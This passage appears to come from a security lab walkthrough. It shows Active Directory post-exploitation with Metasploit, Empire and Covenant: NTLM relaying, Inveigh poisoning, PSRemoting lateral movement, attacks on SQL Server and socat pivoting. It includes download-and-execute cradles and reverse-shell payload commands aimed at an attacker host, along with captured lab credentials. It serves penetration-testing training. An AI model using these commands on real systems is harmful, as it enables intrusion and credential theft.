<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image255.png" srcset="/img/loading.gif"></p>
<p>Once run on the target machine, we can start to set up route for another subnet. Don’t forget to use proper session ID.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">meterpreter</span> &gt; run autoroute -s <span class="hljs-number">10.100.11.0</span>/<span class="hljs-number">24</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image256.png" srcset="/img/loading.gif"></p>
<p>Before moving deeper, we can also use the Get-BrowserData.ps1 script in order to get some information about the recently visited websites.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1">https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1</a></p>
<p>In order to do that, we transfer the script to the remote machine and invoke it in the meterpreter shell.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image257.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image258.png" srcset="/img/loading.gif"></p>
<p>Let’s try to hunt for some NetNTLM hashses using Inveigh. The identified website is in another subnet, we might need to perform some pivoting.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image259.png" srcset="/img/loading.gif"></p>
<p>In order to check if anyone is trying to authenticate to that website, we can launch Invoke-Inveigh which is a powershell-based responder implementation:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image260.png" srcset="/img/loading.gif"></p>
<p>The script can be downloaded from GitHub: <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/Empire-mod-Hpys-tests/blob/master/data/module_source/collection/Invoke-Inveigh.ps1">https://github.com/Hackplayers/Empire-mod-Hpys-tests/blob/master/data/module_source/collection/Invoke-Inveigh.ps1</a> and then transferred and executed on win10-web using the commands:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">. .\<span class="hljs-built_in">Invoke-Inveigh</span>.ps1<br><span class="hljs-built_in">Invoke-Inveigh</span> <span class="hljs-literal">-ConsoleOutput</span> Y<br></code></pre></div></td></tr></table></figure>

<p>As we can see, there are authentication requests. Let’s go back to the attacker machine and try to compromise the identified website’s authentication by relaying the authentication attempts Inveigh spotted. Essentially we will try to perform HTTP NetNTLM relaying against the website authentication.</p>
<p>To do that, we will have to use portproxy to set up port proxying on the win10-web machine.</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use post/windows/manage/portproxy<br><span class="hljs-keyword">set</span> CONNECT_ADDRESS <span class="hljs-comment">10.100.10.2</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">CONNECT_PORT 80</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LOCAL_ADDRESS 10.100.11.101</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LOCAL_PORT 80</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">session 1</span> <br>run<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image261.png" srcset="/img/loading.gif"></p>
<p>Another step will be to create the http relay server:</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use auxiliary/server/http_ntlmrelay <br><span class="hljs-builtin-name">set</span> RHOST 10.100.11.102<br><span class="hljs-builtin-name">set</span> RURIPATH /admin/default.aspx<br><span class="hljs-builtin-name">set</span> URIPATH /<br><span class="hljs-builtin-name">set</span> SRVHOST 10.100.10.102<br><span class="hljs-builtin-name">set</span> SRVPORT 80<br>run<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image262.png" srcset="/img/loading.gif"></p>
<p>We need to pass the session to Empire now. We can perform session passing, by transfering a msbuild-based Empire launcher and executing it from inside our meterpreter session.</p>
<figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">Uselistener</span> <span class="hljs-selector-tag">http</span><br>(<span class="hljs-attribute">Empire</span>: listeners/http) &gt; <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">BindIP</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.2</span><br>(<span class="hljs-attribute">Empire</span>: listeners/http) &gt; <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">Name</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.100</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.2</span><br>(<span class="hljs-attribute">Empire</span>: listeners/http) &gt; <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">Port</span> <span class="hljs-selector-tag">9090</span><br>(<span class="hljs-attribute">Empire</span>: listeners/http) &gt; <span class="hljs-selector-tag">execute</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image263.png" srcset="/img/loading.gif"></p>
<p>Then execute the following commands in Empire:</p>
<figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">usestager windows/launcher_xml<br>set Listener http<br>set OutFile /root/z.<span class="hljs-keyword">xml</span><br><span class="hljs-title">And</span> inside the meterpreter session:<br>powershell curl http://<span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span>:<span class="hljs-number">8888</span>/z.<span class="hljs-keyword">xml</span> <span class="hljs-title">-outfile</span> z.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>\MSBuild.exe c:\users\admin\z.xml<br></code></pre></div></td></tr></table></figure>

<p>The new Empire agent should appear.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image264.png" srcset="/img/loading.gif"></p>
<p>Now we will use inveigh from inside Empire.</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">Agents<br>Interact [ID]<br>usemodule collection/inveigh<br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> SMB <span class="hljs-comment">Y</span><br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">LLMNR Y</span><br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">NBNS Y</span><br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">Proxy Y</span><br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">IP 10.100.11.101</span><br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">HTTPResponse</span><br>&lt;html&gt;&lt;head&gt;&lt;meta <span class="hljs-comment">http-equiv=</span><span class="hljs-comment">&#x27;refresh&#x27;</span> <span class="hljs-comment">content=</span><span class="hljs-comment">&#x27;0; url=http://10.100.11.101&#x27;</span><span class="hljs-comment">&gt;&lt;</span>/head&gt;&lt;/<span class="hljs-comment">html&gt;</span><br>(Empire: powershell/collection/inveigh) &gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">RunTime 10</span><br>(Empire: powershell/collection/inveigh) &gt; execute<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image265.png" srcset="/img/loading.gif"></p>
<p>You should start to see poisoned answers. In the meantime, inspect your Metasploit console in order to see if the relay server successfully relays the captured authentication attempts to the identified website and stores the responses into the MSF DB.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image266.png" srcset="/img/loading.gif"></p>
<p>By using the command “notes” in Metasploit we can see any data stored in database.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image267.png" srcset="/img/loading.gif"></p>
<p>It looks like the relayed authentication attempts worked against the website’s authentication.</p>
<p>You can find some database and privileged user credentials there:</p>
<figure class="highlight gherkin"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gherkin">DataBase Credentials<span class="hljs-variable">&lt;/p&gt;</span><span class="hljs-variable">&lt;/td&gt;</span><span class="hljs-variable">&lt;td&gt;</span><span class="hljs-variable">&lt;b&gt;</span>sa:Cr<span class="hljs-meta">@zyCompl3xP</span><span class="hljs-meta">@ssw0rd&lt;/b&gt;</span> and<br>ELS-CHILD\uatoperator:Cr<span class="hljs-meta">@zyCompl3xP</span><span class="hljs-meta">@ssw0rd</span><br></code></pre></div></td></tr></table></figure>

<h2 id="Lateral-movement-using-PSRemoting"><a href="#Lateral-movement-using-PSRemoting" class="headerlink" title="Lateral movement using PSRemoting"></a>Lateral movement using PSRemoting</h2><p>If you try aforementioned password against ELS-CHILD\uatoperator user, you can notice they work. Having RDP access to Jumpbox will allow you to run a new powershell window as uatoperator using command</p>
<figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit"><span class="hljs-built_in">runas</span> /user:ELS-CHILD\uatoperator powershell.exe<br></code></pre></div></td></tr></table></figure>

<p>Then you can join that machine to Covenant by pasting the launcher to that powershell window.</p>
<p>As you check information about uatoperator, you can see that he is a member of the powershell remoting group. We can try to abuse that fact in order to execute code on the domain controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image268.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image269.png" srcset="/img/loading.gif"></p>
<p>We can try executing code on the DC, as follows:</p>
<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">powershell<span class="hljs-built_in"> invoke-command </span>-computername child-dc01 -scriptblock &#123;hostname&#125;<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image270.png" srcset="/img/loading.gif"></p>
<p>Seeing that, we can try to execute another grunt using the command.</p>
<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">powershell<span class="hljs-built_in"> invoke-command </span>-computername child-dc01 -scriptblock &#123;iex (new-object net.webclient).downloadstring(&#x27;http://10.100.10.2/1.ps1&#x27;)&#125;<br></code></pre></div></td></tr></table></figure>

<p>We can see a new grunt being spawned.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image271.png" srcset="/img/loading.gif"></p>
<h2 id="WMI-Launcher"><a href="#WMI-Launcher" class="headerlink" title="WMI Launcher"></a>WMI Launcher</h2><p>Another lateral movement method is by using a WMI Launcher.</p>
<p>Let’s go to our current high integrity grunt and create new Task named WMIGrunt. Our starting point is High integrity grunt running as ELS\VICTIM on Jumpbox. The task is run with following options:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image272.png" srcset="/img/loading.gif"></p>
<p>You need to supply the target computer hostname. The result will be a new grunt connection spawned from that computer.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image273.png" srcset="/img/loading.gif"></p>
<h2 id="Passing-session-to-Metasploit"><a href="#Passing-session-to-Metasploit" class="headerlink" title="Passing session to Metasploit"></a>Passing session to Metasploit</h2><p>We previously talked about passing sessions to Metasploit. This can be useful for example for the purpose of Pivoting. We will talk about this again but this time through shellcode injection and Covenant. You can perform that exercise on any machine - <strong>preferably jumpbox or win10-web where you have the possibility to debug the Metasploit payload through RDP.</strong></p>
<p>Let’s spawn msfconsole on attacker machine and configure the listener:</p>
<p>We use “setg” instead of “set” because that allows to setup up the variable globally for Metasploit instead just for current module.</p>
<figure class="highlight aspectj"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs aspectj">msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use exploit/multi/<span class="hljs-keyword">handler</span><br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; setg payload windows/x64/meterpreter/reverse_https<br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; setg lhost <span class="hljs-number">10.100</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span><br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; setg lport <span class="hljs-number">9090</span><br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; setg exitfunc thread<br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; setg exitonsession <span class="hljs-keyword">false</span><br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; run -j<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image274.png" srcset="/img/loading.gif"></p>
<p>Next step will be to generate a meterpreter stager with the same settings. Thank to setg utility, we were able to do it without additional settings.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image275.png" srcset="/img/loading.gif"></p>
<p>In a separate terminal, issue the command:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">xxd -ps /tmp/sc.bin | tr -d <span class="hljs-string">&quot;\n&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>The output of that command will be used for direct shellcode injection using Covenant.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image276.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image277.png" srcset="/img/loading.gif"></p>
<p>You can see that the session was opened.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image278.png" srcset="/img/loading.gif"></p>
<h2 id="Attacking-SQL-Server"><a href="#Attacking-SQL-Server" class="headerlink" title="Attacking SQL Server"></a>Attacking SQL Server</h2><p>SQL servers can be commonly found within an Active Directory domain. They have quite some attack surface, as they can be subject to various misconfigurations. Let’s explore further how SQL servers can be approached within a domain using Covenant and PowerUpSQL. The latter can be downloaded from its github repository:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/">https://github.com/NetSPI/PowerUpSQL/</a></p>
<p>Upon downloading, you can transfer its components into your attacker’s machine.</p>
<p>Next, we will use Covenant to Import PowerUpSQL.ps1 using the PowerShellImport task.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image279.png" srcset="/img/loading.gif"></p>
<p>As we now go to the Interact tab, we can now issue cmdlets imported from PowerUpSQL.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image280.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image281.png" srcset="/img/loading.gif"></p>
<p>Using the command Get-SQLInstanceDomain a SQL server within the domain has been identified. We can now prepare to attack it.</p>
<p>You can also try to identify more SQL servers using commands such as:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image282.png" srcset="/img/loading.gif"></p>
<p>Note, that this does not mean that all these servers are active and accessible. For example, the first method that gave us some results is based on SPNs in the domain. If PowerUpSQL finds a SPN related to MSSQLSvc, it lists that server. However, it is possible that a SPN for a non-existent or decommissioned SQL server is present.</p>
<p>You can also pipe the result of the above command to Get-SQLInstanceTestThreaded in order to get accessible databases from within the server. Note that we use another pipe to Format-List in order to prevent truncating the output.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image283.png" srcset="/img/loading.gif"></p>
<p>We can see that only the UATSERVER machine is displayed as “Accessible”.</p>
<p>Due to that, let’s focus on that machine.</p>
<p>We will now try to target the SQL server. <strong>In that scenario we are starting with a medium integrity grunt on jumpbox machine</strong>. Powershell is imported and UATserver is enumerated using PowerUpSQL.</p>
<p>As we execute ping from our attacking machine, we can see that we cannot directly access that machine from our network. We would need some kind of pivoting.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image284.png" srcset="/img/loading.gif"></p>
<p>We will use socat to relay our traffic and be able to hit the remote SQL server from our local windows machine. First, download socat for windows.</p>
<p><a target="_blank" rel="noopener" href="https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip">https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip</a></p>
<p>The downside of using the above is that it utilizes multiple dll libraries, so you will need to transfer all of them to the remote machine. If you prefer to have it compiled statically, you will need to do some coding and patching yourself.</p>
<p>We will use the ready version and move all the libraries to the target machine using the Upload task.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image285.png" srcset="/img/loading.gif"></p>
<p>We need to transfer the .exe as well as its dll libraries.</p>
<p>Note:</p>
<p>In case a newer powershell version is used you would also be able to use the Expand-Archive cmdlet - first, to upload only the .zip file and then simply unpack it. Unfortunately, our victim machine does not have this possibility.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image286.png" srcset="/img/loading.gif"></p>
<p>Finally, we can run socat. Knowing the IP of the SQL server instance (10.100.11.150) obtained by resolving its hostname using ping, we can set up a relay.</p>
<p>Note that we gave you a link to the latest socat version (1.7.3 at the time of writing that).</p>
<p>This is important, because the syntax has changed. You can see the latest socat syntax at</p>
<p><a target="_blank" rel="noopener" href="https://fossies.org/linux/socat/CHANGES">https://fossies.org/linux/socat/CHANGES</a></p>
<p>or by running the binary with a command line argument <strong>socat.exe -h</strong></p>
<p>First, we will create a relay on the remote victim machine.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> .\socat.exe tcp-listen:<span class="hljs-number">1433</span>,tcp-connect:<span class="hljs-number">10.100.11.150:1433</span><br></code></pre></div></td></tr></table></figure>

<p>The reason we use powershell is because with usual “shell” the covenant Task breaks and socat does not work in the intended way.</p>
<p>Currently we have a relay to the SQL server machine. We will also create a relay from our kali to the victim machine, so we can connect a local SQL client to the remote SQL server.</p>
<p>It will go in a way</p>
<p>Local SQL Client -&gt; Kali -&gt; Socat -&gt; Jumpbox -&gt; Socat -&gt; UATSERVER</p>
<p>On our Kali machine we type</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-l:<span class="hljs-number">1433</span>,fork tcp:<span class="hljs-number">10.100.10.250:1433</span><br></code></pre></div></td></tr></table></figure>

<p>As SQL Client we will use HeidiSQL. It can be downloaded from</p>
<p><a target="_blank" rel="noopener" href="https://www.heidisql.com/">https://www.heidisql.com/</a></p>
<p>You can use the database credentials obtained from a previous exercise. <strong>Note that we use a local Windows VM where HeidiSQL is installed.</strong></p>
<p><em>Username: sa</em></p>
<p><em>Password: Cr@zyCompl3xP@ssw0rd</em></p>
<p>By pointing the HeidiSQL Client to the first relay in kali we can reach the uatserver on its end.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image287.png" srcset="/img/loading.gif"></p>
<p>You can then interact with SQL Server from the HeidiSQL Console.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image288.png" srcset="/img/loading.gif"></p>
<p>We can also check if we have the possibility to execute commands on the underlying DB.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image289.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image290.png" srcset="/img/loading.gif"></p>
<p>In order to transfer files from the attacker machine, you might want to set up a socat relay towards the reverse direction:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> .\socat.exe tcp-listen:<span class="hljs-number">8080</span>,tcp-connect:<span class="hljs-number">10.100.10.2:80</span><br></code></pre></div></td></tr></table></figure>

<p>Note that the socat for windows might break. To make sure that your socat instances are still present, you can check through the command:</p>
<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">powershell tasklist <span class="hljs-string">| findstr socat</span><br></code></pre></div></td></tr></table></figure>

<p>If you are looking for a writable directory you might want to examine</p>
<p>*<em>C:\MSSQLDB$\exception*</em></p>
<p>This is because applocker is in place and you might not be allowed to upload to other places.</p>
<p>Also, we will check the current user.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image291.png" srcset="/img/loading.gif"></p>
<p>Using the SQL console we can also view database links.</p>
<p>Database links allow to connect to additional data sources. They do not have to be SQL servers (even Excel sheets can be linked to databases) however, most of the times you will be able to find more SQL dbs.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mssql">SELECT * FROM master..sysservers<br></code></pre></div></td></tr></table></figure>

<p>Allows to return database links of the current database.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image292.png" srcset="/img/loading.gif"></p>
<p>We can follow the links down and also query each of the datasources for its servers. In that case, there are no more physical machines.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image293.png" srcset="/img/loading.gif"></p>
<p>PowerUpSQL also offers the possibility of automated DB link crawling.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image294.png" srcset="/img/loading.gif"></p>
<h2 id="SMB-Grunts"><a href="#SMB-Grunts" class="headerlink" title="SMB Grunts"></a>SMB Grunts</h2><p>Another type of grunt you might want to utilize is SMBGrunt. SMBGrunt communicates with another HTTPGrunt using SMB Named Pipes, which makes it stealthier but also can allow you to bypass network restrictions without pivoting. The architecture of SMBGrunts is as follows:</p>
<p>Attacker Machine (c2) -&gt; HTTPGrunt -&gt; SMBGrunt</p>
<p>In order to create such an architecture, we will need to perform attacks steps in a certain order.</p>
<p><strong>In this exercise we will use jumpbox and win10-web machines with a high integrity grunt - e.g. of ELS-CHILD\victim user.</strong></p>
<p>First, let’s be sure that we have our listener up and ready for the lab infrastructure. We need to assign the proper IP address to it (this of the VPN interface).</p>
<p>If you want to change the listening port and you are using Covenant from Docker, you would need to rebuild your docker container with the new ports exposed. We are using port 80 as usual.</p>
<p>But first, let’s create a SMBGrunt launcher. Go to Launchers and choose PowerShell</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image295.png" srcset="/img/loading.gif"></p>
<p>The template is changed to GruntSMB and SMBPipeName is changed to grunt_smb (to avoid using the default one)</p>
<p>Next, click “generate” and host it as “smb.ps1”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image296.png" srcset="/img/loading.gif"></p>
<p>The new payload string should appear.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image297.png" srcset="/img/loading.gif"></p>
<p>We will download the smbgrunt to Jumpbox. If everything was successful, you should see the below.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image298.png" srcset="/img/loading.gif"></p>
<p>So far, nothing happens and there are no new grunts.</p>
<p>Let’s go to Grunts, choose the active win10-web grunt and choose “Interact”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image299.png" srcset="/img/loading.gif"></p>
<p>Use the below syntax:</p>
<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">connect computername pipename<br></code></pre></div></td></tr></table></figure>

<p>Note that we are now working in the security context of a domain user. If that wasn’t the case we would not be able to connect to that named pipe, due to an authorization requirement.</p>
<p>You can now see that a new SMBGrunt has been spawned.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image300.png" srcset="/img/loading.gif"></p>
<p>In the next task you will make use of that SMB Grunt.</p>
<h2 id="Pivoting-using-Portproxy-and-SMBGrunts"><a href="#Pivoting-using-Portproxy-and-SMBGrunts" class="headerlink" title="Pivoting using Portproxy and SMBGrunts"></a>Pivoting using Portproxy and SMBGrunts</h2><p>One of methods to interact with a foreign network is the aforementioned usage of socat. You can manually set up a number of relays that will tunnel your traffic back and forth.</p>
<p>As we have already mentioned socat may not be the most reliable pivoting solution though. Another way is to perform classic pivoting using Metasploit and meterpreter.</p>
<p>More persistent pivoting can be achieved through Metasploit’s portproxy module.</p>
<p>In order to utilize that technique, you will need to hook the target server with a meterpreter payload of choice. You can do it using the aforementioned hex payload injection technique or in a traditional way - downloading and executing a payload.</p>
<p>First we generate a PowerShell-based meterpreter.</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter_reverse_https -f psh -o msf.ps1 <span class="hljs-attribute">lhost</span>=10.100.10.2 <span class="hljs-attribute">lport</span>=8443 <span class="hljs-attribute">exitfunc</span>=thread<br></code></pre></div></td></tr></table></figure>

